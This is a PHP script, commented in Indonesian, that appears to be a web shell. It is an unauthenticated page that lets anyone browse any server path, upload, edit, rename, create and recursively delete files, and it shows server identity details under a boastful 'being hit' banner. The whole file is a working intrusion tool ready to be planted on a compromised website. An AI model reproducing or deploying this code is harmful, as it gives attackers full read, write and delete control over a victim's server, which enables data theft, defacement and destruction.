<?php
error_reporting(0);

// Fungsi hapus rekursif
function deleteRecursive($target) {
    if (is_dir($target)) {
        $items = scandir($target);
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            deleteRecursive($target . DIRECTORY_SEPARATOR . $item);
        }
        rmdir($target);
    } else {
        unlink($target);
    }
}

// Ambil path aktif
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = realpath($path);
chdir($path);

// Proses DELETE
if (isset($_POST['delete'])) {
    $target = $_POST['delete'];
    if (file_exists($target)) {
        deleteRecursive($target);
    }
}

// Proses rename
if (isset($_POST['rename']) && isset($_POST['newname'])) {
    rename($_POST['rename'], $path . DIRECTORY_SEPARATOR . basename($_POST['newname']));
}

// Proses edit file
if (isset($_POST['editfile']) && isset($_POST['content'])) {
    file_put_contents($_POST['editfile'], $_POST['content']);
}

// Buat file baru
if (isset($_POST['newfile']) && $_POST['newfile'] != '') {
    file_put_contents($path . DIRECTORY_SEPARATOR . basename($_POST['newfile']), '');
}

// Buat folder baru
if (isset($_POST['newfolder']) && $_POST['newfolder'] != '') {
    mkdir($path . DIRECTORY_SEPARATOR . basename($_POST['newfolder']));
}

// Upload file
if (isset($_FILES['upload']) && $_FILES['upload']['error'] == 0) {
    move_uploaded_file($_FILES['upload']['tmp_name'], $path . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']));
}

$files = scandir('.');

// Tampilkan info server
echo "<pre>";
echo "Informasi Server Yang Lagi di SEPONG Asep\n";
echo "Server: " . $_SERVER['HTTP_HOST'] . " (" . $_SERVER['SERVER_ADDR'] . ")\n";
echo "PHP Uname: " . php_uname() . "\n";
echo "Versi PHP: " . phpversion() . "\n";
echo "Folder Saat Ini: $path\n";

// Breadcrumb path
$parts = preg_split('~[\\\\/]~', $path);
$cumulative = '';
$is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
echo "Path: ";
foreach ($parts as $i => $part) {
    if ($is_windows && $i == 0 && preg_match('/^[A-Z]:$/i', $part)) {
        $cumulative = $part;
    } else {
        $cumulative .= DIRECTORY_SEPARATOR . $part;
    }
    echo "<a href='?path=" . urlencode($cumulative) . "'>$part</a>/";
}
echo "</pre>";

// Form Upload
echo "<form method='post' enctype='multipart/form-data'>
    <b>Upload File:</b> <input type='file' name='upload'>
    <input type='submit' value='Upload'>
</form>";

// Form Buat File
echo "<form method='post'>
    <b>Buat File Baru:</b> <input type='text' name='newfile'>
    <input type='submit' value='Buat'>
</form>";

// Form Buat Folder
echo "<form method='post'>
    <b>Buat Folder Baru:</b> <input type='text' name='newfolder'>
    <input type='submit' value='Buat'>
</form>";

// Tabel file/folder
echo "<style>
    table { border-collapse: collapse; width: 100%; }
    th, td { border: 1px solid #ccc; padding: 6px 10px; text-align: left; }
    form { display: inline; margin: 0; }
</style>";

echo "<h3>Daftar File dan Folder:</h3>";
echo "<table>";
echo "<tr><th>Nama</th><th>Tipe</th><th>Aksi</th></tr>";

foreach ($files as $file) {
    if ($file == '.' || $file == '..') continue;
    $fullpath = realpath($file);
    $link = "?path=" . urlencode($fullpath);
    $deleteForm = "<form method='post'>
        <input type='hidden' name='delete' value='" . htmlspecialchars($fullpath, ENT_QUOTES) . "'>
        <input type='submit' value='[delete]'>
    </form>";
    echo "<tr>";
    if (is_dir($file)) {
        echo "<td><a href='$link'>$file</a></td><td>DIR</td><td>$deleteForm</td>";
    } else {
        echo "<td>$file</td><td>FILE</td><td>
            <a href='?edit=" . urlencode($fullpath) . "'>[edit]</a> 
            <a href='?rename=" . urlencode($fullpath) . "'>[rename]</a> 
            $deleteForm
        </td>";
    }
    echo "</tr>";
}
echo "</table>";

// Form Edit
if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    echo "<h3>Edit File: $file</h3>";
    echo "<form method='post'>
    <textarea name='content' rows='20' cols='80'>" . htmlspecialchars(file_get_contents($file)) . "</textarea><br>
    <input type='hidden' name='editfile' value='$file'>
    <input type='submit' value='Save'>
    </form>";
}

// Form Rename
if (isset($_GET['rename'])) {
    $file = $_GET['rename'];
    echo "<h3>Rename File: $file</h3>";
    echo "<form method='post'>
    <input type='hidden' name='rename' value='$file'>
    <input type='text' name='newname' value='" . basename($file) . "'>
    <input type='submit' value='Rename'>
    </form>";
}
?>
